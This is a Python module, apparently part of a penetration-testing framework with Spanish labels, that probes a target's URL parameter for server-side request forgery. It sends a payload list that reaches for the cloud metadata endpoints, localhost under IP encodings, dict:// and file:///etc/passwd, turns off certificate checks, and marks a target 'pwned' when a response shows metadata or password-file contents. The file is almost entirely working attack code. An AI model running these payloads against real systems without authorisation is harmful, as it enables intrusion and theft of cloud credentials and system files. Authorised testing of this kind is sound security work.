# scripts/https/attack/ssrf_detect.py
import ssl, urllib.request, urllib.error, urllib.parse, re
from scripts.base import BaseScript
from core.output import print_result, print_table, print_check, console
from core import session_db

SSRF_PAYLOADS = [
    "http://127.0.0.1/","http://localhost/",
    "http://169.254.169.254/","http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
    "http://[::1]/","http://0.0.0.0/",
    "http://0177.0.0.1/","http://2130706433/",
    "dict://127.0.0.1:22/","file:///etc/passwd",
]
SSRF_INDICATORS = [r"ami-id",r"instance-id",r"root:x:0:0",r"computeMetadata",r"ssh-"]

class Script(BaseScript):
    name        = "ssrf-detect"
    protocol    = "https"
    category    = "attack"
    description = "Detección de SSRF sobre HTTPS via parámetros URL."

    EXAMPLES = [
        {"flag": "--param", "desc": "Parámetro a inyectar",
         "good": "https --script=ssrf-detect -t 10.10.10.5 --path /fetch --param url",
         "bad":  "https --script=ssrf-detect (usa param 'url' por default)"},
    ]

    def run(self, **kwargs):
        port    = int(kwargs.get("port") or 443)
        timeout = int(kwargs.get("timeout") or self.target.timeout or 5)
        path    = kwargs.get("path") or "/"
        param   = kwargs.get("param") or "url"
        ip      = self.target.ip
        base    = f"https://{ip}:{port}"

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        opener   = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        findings = []

        for payload in SSRF_PAYLOADS:
            url = f"{base}{path}?{param}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
                try:
                    resp   = opener.open(req, timeout=timeout)
                    status = resp.status
                    body   = resp.read(65536).decode("utf-8", errors="replace")
                except urllib.error.HTTPError as e:
                    status = e.code
                    body   = e.read(65536).decode("utf-8", errors="replace") if e else ""
                if status == 200:
                    for indicator in SSRF_INDICATORS:
                        if re.search(indicator, body, re.I):
                            findings.append((payload[:60], str(status), indicator))
                            session_db.save_finding(ip, "HTTPS", "ssrf_detected",
                                                    f"param={param} payload={payload[:40]}")
                            print_result("HTTPS", ip, "pwned", f"SSRF: {payload[:40]}")
                            break
            except Exception:
                pass

        if findings:
            print_table(f"SSRF HTTPS — {ip}:{port}", ["Payload","Código","Indicador"], findings)
        else:
            print_check(f"Sin SSRF en '{param}'", ok=True)

        return findings
